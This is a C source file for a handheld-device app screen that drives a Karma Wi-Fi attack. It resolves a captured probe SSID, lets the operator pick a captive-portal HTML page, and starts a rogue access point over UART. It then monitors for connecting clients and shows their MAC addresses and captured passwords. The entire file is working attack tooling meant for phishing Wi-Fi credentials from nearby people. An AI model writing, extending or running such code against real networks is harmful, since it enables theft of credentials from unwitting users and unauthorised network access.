/**
 * Karma Probe Attack Screen
 *
 * Launches a Karma attack using a pre-selected probe SSID.
 * Flow:
 *   1. Resolve probe index via list_probes
 *   2. Load HTML files via list_sd
 *   3. User selects HTML file
 *   4. select_html <index> + start_karma <probe_index>
 *   5. Monitor for client connections and passwords
 *
 * Memory lifecycle:
 * - screen_karma_probe_create(): Allocates KarmaProbeData, thread, view
 * - karma_probe_cleanup_internal(): Frees everything on screen pop
 */

#include "screen_attacks.h"
#include "uart_comm.h"
#include "screen.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <furi.h>

#define TAG "KarmaProbe"
#define KARMA_PROBE_MAX_HTML 20

// ============================================================================
// Data Structures
// ============================================================================

typedef struct {
    WiFiApp* app;
    volatile bool attack_finished;
    uint8_t state;
    // 0 = resolving probe index
    // 1 = HTML selection
    // 2 = attack running

    char ssid[64];
    uint8_t probe_index;   // 1-based index from list_probes

    char html_files[KARMA_PROBE_MAX_HTML][64];
    uint8_t html_count;
    uint8_t selected_html;
    uint8_t scroll_offset;

    char last_mac[20];
    char last_password[64];

    FuriThread* thread;
} KarmaProbeData;

typedef struct {
    KarmaProbeData* data;
} KarmaProbeModel;

// ============================================================================
// Cleanup
// ============================================================================

void karma_probe_cleanup_internal(View* view, void* data) {
    UNUSED(view);
    KarmaProbeData* d = (KarmaProbeData*)data;
    if(!d) return;

    FURI_LOG_I(TAG, "Karma Probe cleanup starting");
    d->attack_finished = true;
    if(d->thread) {
        furi_thread_join(d->thread);
        furi_thread_free(d->thread);
    }
    free(d);
    FURI_LOG_I(TAG, "Karma Probe cleanup complete");
}

// ============================================================================
// Drawing
// ============================================================================

static void karma_probe_draw(Canvas* canvas, void* model) {
    KarmaProbeModel* m = (KarmaProbeModel*)model;
    if(!m || !m->data) return;
    KarmaProbeData* data = m->data;

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);

    if(data->state == 0) {
        screen_draw_title(canvas, "Karma");
        canvas_set_font(canvas, FontSecondary);
        screen_draw_centered_text(canvas, "Resolving probe...", 32);

    } else if(data->state == 1) {
        screen_draw_title(canvas, "Select HTML");
        canvas_set_font(canvas, FontSecondary);

        if(data->html_count == 0) {
            screen_draw_centered_text(canvas, "No HTML files", 32);
        } else {
            uint8_t y = 21;
            uint8_t max_visible = 5;

            // Adjust scroll for selection
            if(data->selected_html >= data->scroll_offset + max_visible) {
                data->scroll_offset = data->selected_html - max_visible + 1;
            } else if(data->selected_html < data->scroll_offset) {
                data->scroll_offset = data->selected_html;
            }

            for(uint8_t i = data->scroll_offset;
                i < data->html_count && (i - data->scroll_offset) < max_visible;
                i++) {
                uint8_t display_y = y + ((i - data->scroll_offset) * 9);
                if(i == data->selected_html) {
                    canvas_draw_box(canvas, 0, display_y - 7, 128, 9);
                    canvas_set_color(canvas, ColorWhite);
                }
                canvas_draw_str(canvas, 2, display_y, data->html_files[i]);
                canvas_set_color(canvas, ColorBlack);
            }
        }

    } else {
        // Attack running
        screen_draw_title(canvas, "Karma");
        canvas_set_font(canvas, FontSecondary);

        char line[48];
        snprintf(line, sizeof(line), "Portal: %.18s", data->ssid);
        canvas_draw_str(canvas, 2, 24, line);

        if(data->last_mac[0]) {
            snprintf(line, sizeof(line), "Last: %s", data->last_mac);
            canvas_draw_str(canvas, 2, 38, line);
        }

        if(data->last_password[0]) {
            snprintf(line, sizeof(line), "Pass: %.18s", data->last_password);
            canvas_draw_str(canvas, 2, 52, line);
        }
    }
}

// ============================================================================
// Input Handling
// ============================================================================

static bool karma_probe_input(InputEvent* event, void* context) {
    View* view = (View*)context;
    if(!view) return false;

    KarmaProbeModel* m = view_get_model(view);
    if(!m || !m->data) {
        view_commit_model(view, false);
        return false;
    }
    KarmaProbeData* data = m->data;

    if(event->type != InputTypeShort && event->type != InputTypeRepeat) {
        view_commit_model(view, false);
        return false;
    }

    if(data->state == 0) {
        // Resolving - only back
        if(event->key == InputKeyBack) {
            data->attack_finished = true;
            uart_send_command(data->app, "stop");
            view_commit_model(view, false);
            screen_pop_to_main(data->app);
            return true;
        }
    } else if(data->state == 1) {
        // HTML selection
        if(event->key == InputKeyUp) {
            if(data->selected_html > 0) data->selected_html--;
        } else if(event->key == InputKeyDown) {
            if(data->selected_html + 1 < data->html_count) data->selected_html++;
        } else if(event->key == InputKeyOk) {
            if(data->html_count > 0) {
                data->state = 2; // Start attack
            }
        } else if(event->key == InputKeyBack) {
            data->attack_finished = true;
            uart_send_command(data->app, "stop");
            view_commit_model(view, false);
            screen_pop_to_main(data->app);
            return true;
        }
    } else {
        // Attack running
        if(event->key == InputKeyBack) {
            data->attack_finished = true;
            uart_send_command(data->app, "stop");
            view_commit_model(view, false);
            screen_pop_to_main(data->app);
            return true;
        }
    }

    view_commit_model(view, true);
    return true;
}

// ============================================================================
// Attack Thread
// ============================================================================

static int32_t karma_probe_thread(void* context) {
    KarmaProbeData* data = (KarmaProbeData*)context;
    WiFiApp* app = data->app;

    FURI_LOG_I(TAG, "Thread started for SSID: %s", data->ssid);

    // Step 1: Resolve probe index via list_probes
    furi_delay_ms(200);
    uart_clear_buffer(app);
    uart_send_command(app, "list_probes");
    furi_delay_ms(100);

    data->probe_index = 0;
    uint32_t start = furi_get_tick();
    while((furi_get_tick() - start) < 2000 && !data->attack_finished) {
        const char* line = uart_read_line(app, 200);
        if(line && line[0]) {
            uint32_t idx = 0;
            char name[64] = {0};
            if(sscanf(line, "%lu %63[^\n]", &idx, name) == 2 && idx > 0) {
                if(strcmp(name, data->ssid) == 0) {
                    data->probe_index = (uint8_t)idx;
                    FURI_LOG_I(TAG, "Probe index resolved: %u", data->probe_index);
                    break;
                }
            }
        }
    }

    if(data->attack_finished) return 0;

    if(data->probe_index == 0) {
        FURI_LOG_E(TAG, "Could not resolve probe index for '%s'", data->ssid);
        data->attack_finished = true;
        return 0;
    }

    // Step 2: Load HTML files via list_sd
    uart_clear_buffer(app);
    uart_send_command(app, "list_sd");
    furi_delay_ms(100);

    start = furi_get_tick();
    while((furi_get_tick() - start) < 2000 &&
          data->html_count < KARMA_PROBE_MAX_HTML &&
          !data->attack_finished) {
        const char* line = uart_read_line(app, 200);
        if(line) {
            if(strstr(line, "HTML files") || strstr(line, "SD card")) continue;

            uint32_t idx = 0;
            char name[64] = {0};
            if(sscanf(line, "%lu %63s", &idx, name) == 2 && idx > 0 && name[0]) {
                strncpy(data->html_files[data->html_count], name, 63);
                data->html_files[data->html_count][63] = '\0';
                data->html_count++;
            }
        }
    }

    if(data->attack_finished) return 0;

    // Move to HTML selection state
    data->state = 1;
    FURI_LOG_I(TAG, "Loaded %u HTML files", data->html_count);

    // Wait for user to select HTML
    while(data->state == 1 && !data->attack_finished) {
        furi_delay_ms(100);
    }
    if(data->attack_finished) return 0;

    // Step 3: Send select_html
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "select_html %u", data->selected_html + 1);
    uart_send_command(app, cmd);
    furi_delay_ms(500);
    uart_clear_buffer(app);

    // Step 4: Start karma with probe index
    snprintf(cmd, sizeof(cmd), "start_karma %u", data->probe_index);
    FURI_LOG_I(TAG, "Sending: %s", cmd);
    uart_send_command(app, cmd);

    // Step 5: Monitor for connections and passwords
    while(!data->attack_finished) {
        const char* line = uart_read_line(app, 500);
        if(line) {
            // Check for client connection
            const char* mac = strstr(line, "Client connected - MAC:");
            if(mac) {
                mac += 24;
                while(*mac == ' ') mac++;
                size_t i = 0;
                while(*mac && *mac != '\n' && i < 17) {
                    data->last_mac[i++] = *mac++;
                }
                data->last_mac[i] = '\0';
            }

            // Check for password
            const char* pwd = strstr(line, "Password:");
            if(pwd) {
                pwd += 10;
                while(*pwd == ' ') pwd++;
                strncpy(data->last_password, pwd, sizeof(data->last_password) - 1);
                data->last_password[sizeof(data->last_password) - 1] = '\0';
            }
        }
        furi_delay_ms(100);
    }

    FURI_LOG_I(TAG, "Thread finished");
    return 0;
}

// ============================================================================
// Screen Creation
// ============================================================================

View* screen_karma_probe_create(WiFiApp* app, const char* probe_ssid, void** out_data) {
    FURI_LOG_I(TAG, "Creating Karma Probe screen for SSID: %s", probe_ssid);

    KarmaProbeData* data = (KarmaProbeData*)malloc(sizeof(KarmaProbeData));
    if(!data) return NULL;

    memset(data, 0, sizeof(KarmaProbeData));
    data->app = app;
    data->attack_finished = false;
    data->state = 0;
    data->probe_index = 0;
    data->html_count = 0;
    data->selected_html = 0;
    data->scroll_offset = 0;

    strncpy(data->ssid, probe_ssid, sizeof(data->ssid) - 1);
    data->ssid[sizeof(data->ssid) - 1] = '\0';

    View* view = view_alloc();
    if(!view) {
        free(data);
        return NULL;
    }

    view_allocate_model(view, ViewModelTypeLocking, sizeof(KarmaProbeModel));
    KarmaProbeModel* m = view_get_model(view);
    m->data = data;
    view_commit_model(view, true);

    view_set_draw_callback(view, karma_probe_draw);
    view_set_input_callback(view, karma_probe_input);
    view_set_context(view, view);

    // Start thread
    data->thread = furi_thread_alloc();
    furi_thread_set_name(data->thread, "KarmaProbe");
    furi_thread_set_stack_size(data->thread, 2048);
    furi_thread_set_callback(data->thread, karma_probe_thread);
    furi_thread_set_context(data->thread, data);
    furi_thread_start(data->thread);

    if(out_data) *out_data = data;

    FURI_LOG_I(TAG, "Karma Probe screen created");
    return view;
}
